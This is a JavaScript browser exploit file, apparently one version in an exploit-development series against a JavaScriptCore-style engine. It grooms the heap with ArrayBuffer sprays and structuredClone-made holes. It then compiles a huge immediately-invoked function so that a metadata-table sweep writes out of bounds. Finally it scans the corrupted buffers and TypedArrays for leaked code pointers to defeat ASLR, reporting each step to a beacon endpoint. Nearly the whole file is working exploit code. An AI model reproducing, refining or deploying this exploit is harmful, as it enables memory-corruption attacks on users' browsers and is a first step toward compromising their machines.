// p500 — MetadataTable overflow ASLR leak with IIFE invocation
//
// ROOT CAUSE OF V153/V156 FAILURE:
//   The function was defined but never called.
//   CodeBlock + MetadataTable are created LAZILY at first call.
//   finishCreation() sweep only runs during prepareForExecution().
//   NO CALL = NO SWEEP = NO OOB WRITES.
//
// FIX: Use IIFE — immediately-invoked function expression.
//   (function(a){if(0){a();a();...38.3M...}window.__ok=1;})(0);
//   The function IS called → finishCreation() runs → sweep writes OOB.
//   if(0) prevents actual execution of the 38.3M calls.
//
// BAIT-AND-SWITCH groom:
//   1. Spray 400 ABs of 100,112 bytes (fills marge pages at low addresses)
//   2. Transfer first 200 via structuredClone (creates holes at low addresses)
//   3. setTimeout → GC → holes are truly freed
//   4. Compile IIFE → MetadataTable (100,112B) fills a freed hole at LOW address
//   5. finishCreation sweep writes FORWARD → hits surviving ABs at HIGH addresses
//   6. Scan surviving ABs for thunk pointers (code base leak)
//
// Additional: scan 8000 TypedArray targets for m_length corruption
//
// Beacon prefix: V500-

(function() {
  var T0 = Date.now();
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V500-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + (Date.now() - T0) + 'ms] ' + (body || ''));
    } catch(e) {}
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }
  function hex8(view, off) {
    var s = '';
    for (var i = 7; i >= 0; i--) s += hexByte(view[off + i]);
    return s;
  }
  function u32(view, off) {
    return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;
  }

  B('BOOT', navigator.userAgent);

  // Phase 1: Spray ABs to fill marge bitfit pages
  var BUF_SZ = 100112; // sizeof(LinkingData)=16 + wrapped totalSize=100096
  var SPRAY_N = 400;
  var bufs = new Array(SPRAY_N);
  var views = [];

  for (var i = 0; i < SPRAY_N; i++) {
    bufs[i] = new ArrayBuffer(BUF_SZ);
  }
  B('SPRAY', 'n=' + SPRAY_N + ',sz=' + BUF_SZ);

  // Phase 2: Transfer first half via structuredClone to create real holes
  // structuredClone with transfer neuTERs the AB, moving backing store to clone
  // setTimeout unwinds stack, GC collects clones → backing stores freed
  var xferred = 0;
  for (var i = 0; i < SPRAY_N / 2; i++) {
    try {
      structuredClone(bufs[i], {transfer: [bufs[i]]});
      xferred++;
    } catch(e) {
      if (xferred === 0) { B('XFER-ERR', e.message); break; }
    }
    bufs[i] = null;
  }
  B('XFER', 'n=' + xferred);

  // Create views on surviving ABs (second half = higher addresses)
  for (var i = Math.floor(SPRAY_N / 2); i < SPRAY_N; i++) {
    if (bufs[i] && bufs[i].byteLength === BUF_SZ) {
      views.push(new Uint8Array(bufs[i]));
    }
  }
  B('VIEWS', 'n=' + views.length);

  // Phase 3: TypedArray targets for m_length corruption
  var TARGET_N = 8000;
  var targets = new Array(TARGET_N);
  for (var i = 0; i < TARGET_N; i++) {
    targets[i] = new Uint8Array(16);
  }
  B('TARGETS', 'n=' + TARGET_N);

  // Phase 4: setTimeout to unwind stack, then GC, then compile IIFE
  setTimeout(function() {
    // Heavy GC to free transferred backing stores
    for (var g = 0; g < 15; g++) {
      var junk = [];
      for (var j = 0; j < 50000; j++) junk.push({x: j});
      junk = null;
    }
    B('GC-DONE', '');

    // Verify views still intact
    var alive = 0;
    for (var v = 0; v < views.length; v++) {
      if (views[v] && views[v].length === BUF_SZ) alive++;
    }
    B('ALIVE', 'n=' + alive);

    // Phase 5: Build IIFE blob
    // KEY FIX: IIFE = function is CALLED → finishCreation() runs → sweep!
    // if(0) prevents execution of the 38.3M a() calls
    var N = 38348816;
    B('BUILD', 'N=' + N);

    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var rep = 'a();'.repeat(CHUNK);

    var parts = new Array(nC + 3);
    // IIFE: (function(a){if(0){...calls...}window.__v500ok=1;})(0);
    parts[0] = '(function(a){if(0){';
    for (var c = 0; c < nC; c++) parts[1 + c] = rep;
    parts[nC + 1] = 'a();'.repeat(rem);
    parts[nC + 2] = '}window.__v500ok=1;})(0);';
    rep = null;

    var blob = new Blob(parts, {type: 'application/javascript'});
    B('BLOB', 'sz=' + Math.round(blob.size / 1048576) + 'MB');
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onerror = function() { B('SCRIPT-ERR', ''); };

    sc.onload = function() {
      var ok = window.__v500ok ? 'OK' : 'FAIL';
      B('COMPILED', ok);

      if (ok !== 'OK') {
        B('DONE', 'compile-fail');
        return;
      }

      // Phase 6: Scan!
      setTimeout(doScan, 200);
    };

    document.head.appendChild(sc);
    sc.src = url;
  }, 500);

  function doScan() {
    B('SCAN-START', '');

    // === SCAN A: Check spray ABs for ANY non-zero bytes ===
    var hitBufs = 0;
    var totalNZ = 0;
    var leakedPtrs = [];

    for (var vi = 0; vi < views.length; vi++) {
      var view = views[vi];
      if (!view) continue;

      // Quick check: sample every 112 bytes for non-zero
      var hasNZ = false;
      for (var q = 0; q < view.length && !hasNZ; q += 8) {
        if (view[q] !== 0 || view[q+1] !== 0 || view[q+2] !== 0 || view[q+3] !== 0) {
          hasNZ = true;
        }
      }
      if (!hasNZ) continue;
      hitBufs++;

      // Full non-zero byte count
      var nz = 0;
      var firstOff = -1;
      for (var j = 0; j < view.length; j++) {
        if (view[j] !== 0) {
          if (firstOff === -1) firstOff = j;
          nz++;
        }
      }
      totalNZ += nz;
      B('HIT-' + vi, 'nz=' + nz + ',first=' + firstOff);

      if (hitBufs > 5) break; // Don't over-beacon

      // Auto-detect entry alignment: find base where most 8-byte blocks at stride 112 have non-zero
      var bestBase = -1, bestHits = 0;
      for (var tryBase = 0; tryBase < 112; tryBase += 4) {
        var hits = 0;
        for (var off = tryBase; off + 8 <= view.length; off += 112) {
          if (view[off] !== 0 || view[off+1] !== 0 || view[off+2] !== 0 || view[off+3] !== 0 ||
              view[off+4] !== 0 || view[off+5] !== 0 || view[off+6] !== 0 || view[off+7] !== 0) hits++;
        }
        if (hits > bestHits) { bestHits = hits; bestBase = tryBase; }
      }
      B('EBASE-' + vi, 'base=' + bestBase + ',hits=' + bestHits);

      // Extract thunk pointers at entryBase+24
      var ptrsDumped = 0;
      for (var eOff = bestBase; eOff + 112 <= view.length && ptrsDumped < 8; eOff += 112) {
        var pOff = eOff + 24;
        if (pOff + 8 > view.length) break;
        if (view[pOff] === 0 && view[pOff+1] === 0 && view[pOff+2] === 0 && view[pOff+3] === 0 &&
            view[pOff+4] === 0 && view[pOff+5] === 0 && view[pOff+6] === 0 && view[pOff+7] === 0) continue;
        var h = hex8(view, pOff);
        B('THUNK-' + ptrsDumped, 'off=' + pOff + ',val=0x' + h);
        if (leakedPtrs.length < 5) leakedPtrs.push(h);
        ptrsDumped++;
      }

      // Also extract m_bytecodeIndex at entryBase+68
      var idxDumped = 0;
      for (var eOff = bestBase; eOff + 72 <= view.length && idxDumped < 5; eOff += 112) {
        var iOff = eOff + 68;
        if (iOff + 4 > view.length) break;
        var val = u32(view, iOff);
        if (val !== 0) {
          B('IDX-' + idxDumped, 'off=' + iOff + ',val=' + val + ',hex=0x' + val.toString(16));
          idxDumped++;
        }
      }

      // Raw hex dump of first 256 bytes of first hit
      if (hitBufs === 1) {
        var chunks = [];
        for (var off = 0; off + 8 <= 256 && off + 8 <= view.length; off += 8) {
          if (view[off] !== 0 || view[off+1] !== 0 || view[off+2] !== 0 || view[off+3] !== 0 ||
              view[off+4] !== 0 || view[off+5] !== 0 || view[off+6] !== 0 || view[off+7] !== 0) {
            chunks.push(off + ':0x' + hex8(view, off));
          }
        }
        if (chunks.length > 0) B('RAW', chunks.slice(0, 15).join(' '));
      }
    }

    B('SPRAY-RESULT', 'hitBufs=' + hitBufs + ',totalNZ=' + totalNZ + ',ptrs=' + leakedPtrs.length);

    // === SCAN B: TypedArray m_length corruption ===
    var leakN = 0, bigN = 0, errN = 0;
    var leaked = [];

    for (var i = 0; i < TARGET_N; i++) {
      try {
        var len = targets[i].length;
        if (len !== 16) {
          if (len > 281474976710656) { bigN++; }
          else if (len > 4096) {
            if (leaked.length < 10) leaked.push(len);
            leakN++;
          }
          targets[i] = null;
        }
      } catch(e) { errN++; targets[i] = null; }
    }

    B('TYPED-RESULT', 'leak=' + leakN + ',big=' + bigN + ',err=' + errN);

    if (leaked.length > 0) {
      for (var j = 0; j < Math.min(leaked.length, 5); j++) {
        try { B('TLEAK-' + j, '0x' + BigInt(leaked[j]).toString(16)); }
        catch(e) { B('TLEAK-' + j, '' + leaked[j]); }
      }
    }

    // === Summary ===
    if (leakedPtrs.length > 0) {
      B('ASLR-SPRAY', 'ptr0=0x' + leakedPtrs[0]);
    }
    if (leakN > 0) {
      B('ASLR-TYPED', 'n=' + leakN);
    }
    if (leakedPtrs.length > 0 || leakN > 0) {
      B('ASLR-LEAK-CONFIRMED', '');
    } else if (hitBufs > 0) {
      B('SWEEP-HIT-NO-PTR', 'hitBufs=' + hitBufs);
    } else {
      B('NO-HIT', '');
    }

    B('DONE', 'hitBufs=' + hitBufs + ',ptrs=' + leakedPtrs.length + ',typed=' + leakN);
  }
})();
